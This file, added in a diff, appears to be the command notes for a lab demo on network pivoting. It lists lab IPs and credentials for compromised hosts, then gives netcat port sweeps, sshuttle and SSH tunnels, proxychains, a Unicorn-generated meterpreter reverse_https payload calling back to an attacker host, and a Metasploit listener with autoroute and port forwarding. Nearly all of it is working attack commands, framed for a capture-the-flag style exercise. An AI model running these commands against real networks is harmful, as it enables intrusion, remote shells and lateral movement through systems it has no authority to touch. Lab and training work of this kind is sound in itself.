@@ -1,0 +1,115 @@
+#pwnDefend demo
+
+#####TOOLS#####
+SSHUTTTLE
+#To install use:
+apt-get install sshuttle
+
+
+###############CROWN JEWEWLS###############
+192.168.2.12
+192.168.2.8
+#capture the flag on web servers on these addresses
+192.168.2.16 (lab flag)
+
+#compromised LINUX machine IP is 192.168.3.4 - username helios:Pa55w0rd1
+#compromised Windows machine IP is 192.168.3.3 - username garry:Pa55w0rd1
+
+#Network Pivoting
+
+#Test pivot connection
+ssh helios@192.168.3.4
+
+nmap 192.168.2.16/24
+
+#netcat port scan
+
+nc -z -v -w 1 192.168.2.29 1-1000
+
+nc -z -v -w 1 192.168.2.29 440-1000 2>&1 | grep "succeeded"
+
+#output to file (we will limit the port scan here for speed)
+nc -z -v -w 1 192.168.2.29 440-446 2>&1 | grep "succeeded"
+
+nc -z -v -w 1 192.168.2.29 440-446 2>&1 | grep "succeeded" > output.log
+
+#find all http servers
+nc -z -v -w 1 192.168.2.16 80 2>&1 | grep "succeeded" > output.log
+
+#hunt web servers on TCP 80
+for IP in {1..254}; do nc -z -v -w 1 192.168.2.$IP 80 2>&1 | grep "succeeded"; done
+#hunt SMB on TCP 445
+for IP in {1..254}; do nc -z -v -w 1 192.168.2.$IP 445 2>&1 | grep "succeeded"; done
+#hunt RDP on TCP 3389
+for IP in {1..254}; do nc -z -v -w 1 192.168.2.$IP 3389 2>&1 | grep "succeeded"; done
+e
+###examples#####
+
+#straight tunnel
+sshuttle -r helios@192.168.3.4 192.168.2.0/24 -vv
+#with DNS (note this has limited success, I've not had it working... ever!)
+sshuttle --dns -r helios@192.168.3.4 192.168.2.0/24 -vv
+
+#SSH FORWARDING
+#local forwarding (connect a local tcp port to a remoe hosts tcp port e.g. mysql)
+#target a remote ssh server and expose a port
+#flag 1
+ssh -L 80:127.0.0.1:80 helios@192.168.3.4
+#flag 2 - now we want to get to an different IP
+ssh -L 80:192.168.2.8:80 helios@192.168.3.4
+
+#PROXY CHAINS
+ssh -D 9050 helios@192.168.3.4
+#re-configure proxy chains
+#nano /etc/proxychains.conf
+# add socks4	127.0.0.1 9050 to the proxy list
+proxychains firefoxback
+#navigate to http://192.168.2.12/
+
+#METASPLPOIT
+
+#create a payload using UNICORN
+git clone https://github.com/trustedsec/unicorn.git
+cd unicorn
+python unicorn.py windows/meterpreter/reverse_https 192.168.3.10 443
+#copy this to the target
+
+## RUN MSF
+service postgresql start
+msfconsole
+
+#SETUP A LISTENER
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LPORT 443
+set LHOST 192.168.3.10
+set exitonsession false
+run -j
+
+#connect to the session
+sessions
+session 2
+sysinfo
+ipconfig
+run autoroute -h
+run autoroute -s 192.168.2.0/24
+background
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.2.0/24
+set PORTS 137,139,445,3389,80,443
+set THREADS 50
+
+
+
+sessions 2
+portfwd add -l 80 -lp 80 -r 192.168.2.16
+portfwd add -l 3389 -lp 3389 -r 192.168.2.16
+
+#useful commands for PORTFWD
+portfwd delete -l 80 -lp 80 -r 192.168.2.16
+portfwd delete -l 3389 -lp 3389 -r 192.168.2.16
+
+
+#flush all port forwards
+portfwd delete -l 80 -lp 80 -r 192.168.2.16
